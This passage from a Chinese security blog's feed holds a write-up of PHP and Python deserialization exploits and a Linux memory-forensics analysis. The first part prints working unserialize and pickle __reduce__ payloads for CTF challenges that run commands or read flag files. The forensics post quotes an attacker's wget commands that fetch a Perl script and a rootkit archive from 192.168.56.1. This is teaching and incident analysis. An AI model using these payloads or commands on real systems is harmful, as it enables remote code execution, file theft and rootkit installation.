php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;__construct&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a-&gt;action();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;one&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">one</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> Student();</span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>代码有一个构造函数<code>__construct</code>输出<code>__construct</code>，在<code>new</code>这个对象时自动调用，一个析构函数<code>__destruct</code>将当我们传入的<code>a</code>再传进<code>one</code>对象中执行，构造代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="keyword">new</span> one();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">one</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$b</span> = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> Student());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">7</span>:<span class="string">&quot;Student&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;one&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;phpinfo();&quot;</span>;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/deserialization-1.png" alt="deserialization-1"></p><p>成功触发。</p><h3 id="实例：网鼎杯-2020-青龙组-AreUSerialz"><a href="#实例：网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="实例：网鼎杯 2020 青龙组 AreUSerialz"></a>实例：网鼎杯 2020 青龙组 AreUSerialz</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = unserialize(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里需要读<code>flag.php</code>文件，在<code>process()</code>函数中，当<code>op=2</code>时，<code>read()</code>中的<code>file_get_contents</code>就会执行，<code>is_valid()</code>会判断传入的字符串是否为可打印字符，而原来的类修饰均为<code>protected</code>，在序列化时会生成不可见的<code>\x00</code>，但<code>php7+</code>对类的属性类型不敏感，可直接把属性修饰为<code>public</code>，成功绕过<code>is_valid()</code>。</p><p>构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>).<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>传入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?str=O:11:<span class="string">&quot;FileHandler&quot;</span>:3:&#123;s:2:<span class="string">&quot;op&quot;</span>;i:2;s:8:<span class="string">&quot;filename&quot;</span>;s:8:<span class="string">&quot;flag.php&quot;</span>;s:7:<span class="string">&quot;content&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/deserialization-2.png" alt="deserialization-2"></p><h2 id="0x02-PYTHON"><a href="#0x02-PYTHON" class="headerlink" title="0x02 PYTHON"></a>0x02 PYTHON</h2><p><code>python</code>中序列化一般有两种方式：<code>pickle</code>模块和<code>json</code>模块，前者是<code>python</code>特有的格式，后者是<code>json</code>通用的格式。</p><p>以下均显示为<code>python2</code>版本序列化输出结果，<code>python3</code>的<code>pickle.dumps</code>结果与<code>python2</code>不一样。</p><p><font color=red><strong>pickle</strong></font></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="built_in">dict</span> = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&#x27;zjun&#x27;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">19</span>&#125;</span><br><span class="line">a = pickle.dumps(<span class="built_in">dict</span>)</span><br><span class="line">print(a, <span class="built_in">type</span>(a))</span><br><span class="line">b = pickle.loads(a)</span><br><span class="line">print(b, <span class="built_in">type</span>(b))</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">&quot;(dp0\nS&#x27;age&#x27;\np1\nI19\nsS&#x27;name&#x27;\np2\nS&#x27;zjun&#x27;\np3\ns.&quot;</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;str&#x27;</span>&gt;)</span><br><span class="line">(&#123;<span class="string">&#x27;age&#x27;</span>: 19, <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;zjun&#x27;</span>&#125;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict&#x27;</span>&gt;)</span><br></pre></td></tr></table></figure><p><font color=red><strong>json</strong></font></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="built_in">dict</span> = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&#x27;zjun&#x27;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">19</span>&#125;</span><br><span class="line">a = json.dumps(<span class="built_in">dict</span>, indent=<span class="number">4</span>)</span><br><span class="line">print(a, <span class="built_in">type</span>(a))</span><br><span class="line">b = json.loads(a)</span><br><span class="line">print(b, <span class="built_in">type</span>(b))</span><br></pre></td></tr></table></figure><p>其中<code>indent=4</code>起到一个数据格式化输出的效果，当数据多了就显得更为直观，输出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;zjun&quot;</span>,</span><br><span class="line">    <span class="string">&quot;age&quot;</span>: 19</span><br><span class="line">&#125; &lt;class <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;zjun&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: 19&#125; &lt;class <span class="string">&#x27;dict&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p>再看看一个<code>pickle</code>模块导致的安全问题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">obj</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        a = <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (a, ))</span><br><span class="line"></span><br><span class="line">r = pickle.dumps(obj())</span><br><span class="line">print(r)</span><br><span class="line">pickle.loads(r)</span><br></pre></td></tr></table></figure><p>通过构造<code>__reduce__</code>可达到命令执行的目的，详见：<a href="https://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html">Python魔法方法指南</a></p><p><img src="https://oss.zjun.info/zjun.info/deserialization-3.webp" alt="deserialization-3"></p><p>先输出<code>obj</code>对象的序列化结果，再将其反序列化，输出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cposix</span><br><span class="line">system</span><br><span class="line">p0</span><br><span class="line">(S<span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">p1</span><br><span class="line">tp2</span><br><span class="line">Rp3</span><br><span class="line">.</span><br><span class="line">zjun</span><br></pre></td></tr></table></figure><p>成功执行了<code>whoami</code>命令。</p><h3 id="实例：CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#实例：CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="实例：CISCN2019 华北赛区 Day1 Web2 ikun"></a>实例：CISCN2019 华北赛区 Day1 Web2 ikun</h3><p><a href="https://blog.zjun.info/2019/ikun.html">CISCN2019 华北赛区 Day1 Web2 ikun</a>，前面的细节讲得很清楚了，这里接着看反序列化的考点。</p><p><img src="https://oss.zjun.info/zjun.info/deserialization-4.png" alt="deserialization-4"></p><p>第<code>19</code>行处直接接收<code>become</code>经<code>url</code>解码与其反序列化的内容，存在反序列化漏洞，构造<code>payload</code>读取<code>flag.txt</code>文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">       <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</span><br></pre></td></tr></table></figure><p>将生成的<code>payload</code>传给<code>become</code>即可。</p><p>再推荐一下P师傅的<a href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html"><code>python</code>反序列化漏洞挖掘</a>。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Web </tag>
            
            <tag> 漏洞分析 </tag>
            
            <tag> 反序列化漏洞 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次Linux镜像取证</title>
      <link href="2020/a-linux-image-forensics.html"/>
      <url>2020/a-linux-image-forensics.html</url>
      
        <content type="html"><![CDATA[<p>本文首发于i春秋：<a href="https://bbs.ichunqiu.com/thread-56889-1-5.html">https://bbs.ichunqiu.com/thread-56889-1-5.html</a><br>题目地址：<a href="http://www.honeynet.org/challenges/2011_7_compromised_server">http://www.honeynet.org/challenges/2011_7_compromised_server</a><br>使用工具：<a href="https://github.com/volatilityfoundation/volatility">volatility</a></p><a id="more"></a><p>查看题目要求</p><p><img src="https://oss.zjun.info/zjun.info/linux-quzhen-1.webp" alt="linux-quzhen-1"></p><p>下载这三个镜像并将<code>victoria-v8.sda1.img</code>挂载到<code>/mnt</code>目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mount -o loop victoria-v8.sda1.img /mnt</span><br></pre></td></tr></table></figure><p>在<code>/mnt</code>目录下可以看见</p><p><img src="https://oss.zjun.info/zjun.info/linux-quzhen-2.webp" alt="linux-quzhen-2"></p><p>首先查看系统版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat etc/issue</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/linux-quzhen-3.webp" alt="linux-quzhen-3"></p><p>在<code>var/log</code>目录下查看<code>Linux</code>的版本</p><p><img src="https://oss.zjun.info/zjun.info/linux-quzhen-4.webp" alt="linux-quzhen-4"></p><p>然后制作版本对应的<code>profile</code>，可自己手动制作，也可以使用<code>github</code>上制作好的<br>Github项目：<a href="https://github.com/volatilityfoundation/profiles">https://github.com/volatilityfoundation/profiles</a></p><p><img src="https://oss.zjun.info/zjun.info/linux-quzhen-5.webp" alt="linux-quzhen-5"></p><p>下载<code>debian5010</code>解压后放在<code>/volatility/plugins/overlays/linux</code>目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py --info</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/linux-quzhen-6.webp" alt="linux-quzhen-6"></p><p>现在开始分析镜像文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f /home/reder/Desktop/tools/取证/取证镜像/victoria-v8.memdump.img --profile=LinuxDebian5010x86 linux_psaux</span><br></pre></td></tr></table></figure><p>可以看见以下的输出</p><p><img src="https://oss.zjun.info/zjun.info/linux-quzhen-7.webp" alt="linux-quzhen-7"></p><p>我们可以发现一个可疑的<code>nc</code>连接，连接到<code>192.168.56.1</code>端口是<code>8888</code><br>查看网络信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f /home/reder/Desktop/tools/取证/取证镜像/victoria-v8.memdump.img --profile=LinuxDebian5010x86 linux_netstat</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/linux-quzhen-8.webp" alt="linux-quzhen-8"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TCP 192.168.56.102:25 192.168.56.101:37202 CLOSE sh/2065</span><br><span class="line">TCP 192.168.56.102:25 192.168.56.101:37202 CLOSE sh/2065</span><br></pre></td></tr></table></figure><p>有两个已经关闭的连接。</p><p>查看<code>bash</code>记录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f /home/reder/Desktop/tools/取证/取证镜像/victoria-v8.memdump.img --profile=LinuxDebian5010x86 linux_bash</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/linux-quzhen-9.webp" alt="linux-quzhen-9"></p><p>可以发现复制了<code>exim4</code>目录下的所有文件，我们切换至<code>/mnt/var/log/exim4</code>目录下，运行<code>su</code>后进入，查看<code>rejectlog</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat rejectlog</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/linux-quzhen-10.webp" alt="linux-quzhen-10"></p><p><img src="https://oss.zjun.info/zjun.info/linux-quzhen-11.png" alt="linux-quzhen-11"></p><p><img src="https://oss.zjun.info/zjun.info/linux-quzhen-12.webp" alt="linux-quzhen-12"></p><p>日志显示<code>IP</code> <code>192.168.56.101</code>作为发送邮件的主机，结合上面已经关闭的连接，基本表明<code>192.168.56.101</code>是一个攻击<code>IP</code>。</p><blockquote><p>wget <a href="http://192.168.56.1/c.pl">http://192.168.56.1/c.pl</a> -O /tmp/c.pl<br>wget <a href="http://192.168.56.1/rk.tar">http://192.168.56.1/rk.tar</a> -O /tmp/rk.tar</p></blockquote><p>攻击者下载了<code>c.pl</code>和<code>rk.tar</code>两个文件到<code>/tmp</code>下<br>查看一下<code>c.pl</code></p><p><img src="https://oss.zjun.info/zjun.info/linux-quzhen-13.png" alt="linux-quzhen-13"></p><p>是一个<code>perl</code>脚本文件，可以自行审计。</p><p>查看日志</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auth.log</span><br></pre></td></tr></table></figure><p><img src="https://oss.zjun.info/zjun.info/linux-quzhen-14.webp" alt="linux-quzhen-14"></p><p><img src="https://oss.zjun.info/zjun.info/linux-quzhen-15.png" alt="linux-quzhen-15"></p><p>可发现攻击者爆破了<code>192.168.56.1</code>的<code>ssh</code>密码，但是最终并未成功。</p><p>综上可以基本确定攻击者通过<code>Exim</code>进行攻击的。漏洞编号为<code>CVE-2010-4344</code>。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 镜像取证 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux、dwm关于部分问题的解决方案</title>
      <link href="2020/solutions-to-some-problems-with-linux-and-dwm.html"/>
      <url>2020/solutions-to-some-problems-with-linux-and-dwm.html</url>
      
